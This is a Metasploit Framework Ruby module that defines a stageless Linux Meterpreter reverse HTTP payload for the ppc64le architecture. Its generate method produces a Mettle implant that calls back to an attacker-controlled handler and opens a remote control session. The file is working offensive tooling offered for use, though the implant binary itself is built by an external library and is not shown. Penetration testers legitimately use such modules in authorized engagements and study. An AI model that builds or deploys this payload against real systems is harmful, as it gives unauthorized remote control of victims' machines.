##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 1169208

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter, Reverse HTTP Inline',
        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>',
          'timwr'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_PPC64LE,
        'License'       => MSF_LICENSE,
        'Handler'       => Msf::Handler::ReverseHttp,
        'Session'       => Msf::Sessions::Meterpreter_ppc64le_Linux
      )
    )
  end

  def generate
    opts = {
      scheme: 'http',
      stageless: true
    }
    MetasploitPayloads::Mettle.new('powerpc64le-linux-musl', generate_config(opts)).to_binary :exec
  end
end
